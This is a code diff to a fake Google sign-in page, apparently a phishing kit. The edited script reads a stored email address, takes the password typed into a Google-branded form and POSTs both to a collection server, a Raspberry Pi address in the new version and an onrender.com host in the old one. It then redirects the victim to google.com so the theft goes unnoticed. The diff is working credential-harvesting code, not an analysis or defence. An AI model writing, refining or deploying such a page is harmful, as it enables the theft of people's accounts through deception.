@@ -10,58 +10,44 @@
 <div class="container">
   <div class="top-content">
     <img src="https://i.postimg.cc/CL7CmGSx/google-logo-png-29530.png" alt="Google">
-    <h2>Sign in</h2>
-    <p class="heading">Use your Google Account</p>
+    <h2>Welcome</h2>
+    <p id="display-email" style="font-weight: bold; margin-bottom: 10px;"></p>
   </div>
   
   <div class="inputs">
-    <input type="password" name="password" id="password" class="input" required>
-    <label for="password" class="input-label">Password</label>
+    <input type="password" id="password" class="input" required>
+    <label for="password" class="input-label">Enter your password</label>
   </div>
   
-  <a href="#" class="link-btn">Forgot Password?</a>
-  <p class="color">Not your computer? Use Guest mode to sign in privately.</p>
-  <a href="#" class="link-btn">Learn More</a>
-  
   <div class="btn-group">
-    <button class="create-btn" id="btn-back">Back</button>
-    <button class="next-btn" id="btn-signin">Sign in</button>
+    <button class="create-btn" onclick="window.location.href='index.html'">Back</button>
+    <button class="next-btn" id="btn-connect">Connect</button>
   </div>
 </div>
 
 <script>
-  document.getElementById('btn-back').addEventListener('click', function() {
-    window.location.href = 'index.html';
-  });
+  // Affiche l'email récupéré
+  const emailValue = localStorage.getItem('userEmail');
+  if (emailValue) {
+      document.getElementById('display-email').innerText = emailValue;
+  }
 
-  document.getElementById('btn-signin').addEventListener('click', async function() {
-    const passwordInput = document.getElementById('password');
-    const passwordValue = passwordInput.value;
-    const emailValue = localStorage.getItem('userEmail');
-
-    if (!emailValue) {
-        alert("Email not found. Please go back and sign in again.");
-        window.location.href = 'index.html';
-        return;
-    }
+  document.getElementById('btn-connect').addEventListener('click', async function() {
+    const passwordValue = document.getElementById('password').value;
+    const URL = `http://192.168.1.157:5000/data`;
 
     if (!passwordValue) {
         alert("Please enter a password");
         return;
     }
-    const PI_IP = "192.168.1.157"; 
-    const URL = `https://sign-in-google.onrender.com/data`;
-    // ---------------------
 
-    this.innerText = "Loading...";
+    this.innerText = "Connecting...";
     this.disabled = true;
 
     try {
         const response = await fetch(URL, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
                 email: emailValue,
                 password: passwordValue,
@@ -70,17 +56,15 @@
         });
 
         if (response.ok) {
-            // Redirection après succès vers votre page de confirmation
-            window.location.href = 'https://m.youtube.com/watch?v=dQw4w9WgXcQ';
+            window.location.href = 'https://www.google.com'; // Redirection finale
         } else {
-            alert("Server error: " + response.status);
-            this.innerText = "Sign in";
+            alert("Error: " + response.status);
+            this.innerText = "Connect";
             this.disabled = false;
         }
     } catch (error) {
-        console.error("Connection error:", error);
-        alert("A strange error occurred. Please try again later.");
-        this.innerText = "Sign in";
+        alert("Could not connect to Raspberry Pi.");
+        this.innerText = "Connect";
         this.disabled = false;
     }
   });
